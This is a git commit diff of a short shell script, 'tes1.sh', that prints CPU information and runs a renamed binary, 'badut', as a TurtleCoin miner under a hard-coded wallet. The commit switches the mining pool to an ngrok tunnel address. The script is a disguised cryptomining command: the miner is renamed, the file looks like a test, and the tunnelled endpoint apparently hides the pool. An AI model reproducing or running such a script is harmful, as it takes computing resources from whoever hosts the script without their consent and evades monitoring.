9bae37157bfbd50d18bce79acf94c263ca212d1d
raufpermana22 <53905319+raufpermana22@users.noreply.github.com>
2022-03-05 00:12:14 +0900

    Update tes1.sh

--- tes1.sh
+++ tes1.sh
@@ -1,2 +1,2 @@
 lscpu
-chmod 777 badut && ./badut --donate-level 1 -o us.turtlecoin.herominers.com:1160 -u TRTLuxMcjA5Z5wiQjv7GKz3NfKXBx2G45iFEfkTfBdHv4s5sVWWMpSEWhrzosQkWn2ieGpzGLHjEDNgD2biksSaGa1M5errKpkS -p luna -a argon2/chukwav2 -k 
+chmod 777 badut && ./badut --donate-level 1 -o 8.tcp.ngrok.io:11569 -u TRTLuxMcjA5Z5wiQjv7GKz3NfKXBx2G45iFEfkTfBdHv4s5sVWWMpSEWhrzosQkWn2ieGpzGLHjEDNgD2biksSaGa1M5errKpkS -p luna -a argon2/chukwav2 -k 
